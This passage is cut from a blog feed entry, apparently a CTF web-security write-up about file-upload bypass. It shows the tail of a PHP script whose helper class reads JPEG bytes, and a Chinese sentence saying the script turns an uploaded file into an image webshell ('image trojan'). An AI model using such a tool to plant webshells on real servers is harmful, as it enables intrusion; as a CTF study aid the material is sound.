class="string">&#x27;/(\d+) extraneous bytes before marker/&#x27;</span>, <span class="variable">$errstr</span>, <span class="variable">$m</span>)) &#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$m</span>[<span class="number">1</span>])) &#123;</span><br><span class="line">                <span class="variable">$extraBytes</span> = (<span class="keyword">int</span>)<span class="variable">$m</span>[<span class="number">1</span>];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">DataInputStream</span> </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$binData</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$order</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$size</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$filename</span>, <span class="variable">$order</span> = <span class="literal">false</span>, <span class="variable">$fromString</span> = <span class="literal">false</span></span>) </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;binData = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;order = <span class="variable">$order</span>;</span><br><span class="line">            <span class="keyword">if</span>(!<span class="variable">$fromString</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span>(!<span class="title function_ invoke__">file_exists</span>(<span class="variable">$filename</span>) || !<span class="title function_ invoke__">is_file</span>(<span class="variable">$filename</span>))</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">&#x27;File not exists [&#x27;</span>.<span class="variable">$filename</span>.<span class="string">&#x27;]&#x27;</span>);</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;binData = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$filename</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;binData = <span class="variable">$filename</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;size = <span class="title function_ invoke__">strlen</span>(<span class="variable">$this</span>-&gt;binData);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">seek</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> (<span class="variable language_">$this</span>-&gt;size - <span class="title function_ invoke__">strlen</span>(<span class="variable">$this</span>-&gt;binData));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">skip</span>(<span class="params"><span class="variable">$skip</span></span>) </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;binData = <span class="title function_ invoke__">substr</span>(<span class="variable">$this</span>-&gt;binData, <span class="variable">$skip</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">readByte</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">eof</span>()) &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;End Of File&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$byte</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$this</span>-&gt;binData, <span class="number">0</span>, <span class="number">1</span>);</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;binData = <span class="title function_ invoke__">substr</span>(<span class="variable">$this</span>-&gt;binData, <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="title function_ invoke__">ord</span>(<span class="variable">$byte</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">readShort</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$this</span>-&gt;binData) &lt; <span class="number">2</span>) &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;End Of File&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$short</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$this</span>-&gt;binData, <span class="number">0</span>, <span class="number">2</span>);</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;binData = <span class="title function_ invoke__">substr</span>(<span class="variable">$this</span>-&gt;binData, <span class="number">2</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;order) &#123;</span><br><span class="line">                <span class="variable">$short</span> = (<span class="title function_ invoke__">ord</span>(<span class="variable">$short</span>[<span class="number">1</span>]) &lt;&lt; <span class="number">8</span>) + <span class="title function_ invoke__">ord</span>(<span class="variable">$short</span>[<span class="number">0</span>]);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$short</span> = (<span class="title function_ invoke__">ord</span>(<span class="variable">$short</span>[<span class="number">0</span>]) &lt;&lt; <span class="number">8</span>) + <span class="title function_ invoke__">ord</span>(<span class="variable">$short</span>[<span class="number">1</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$short</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">eof</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> !<span class="variable language_">$this</span>-&gt;binData||(<span class="title function_ invoke__">strlen</span>(<span class="variable">$this</span>-&gt;binData) === <span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>对我们上传后的文件执行这段php代码就得到我们的jpg图片马。</p>
]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>Ctf-Web</tag>
        <tag>文件上传</tag>
      </tags>
  </entry>
</search>
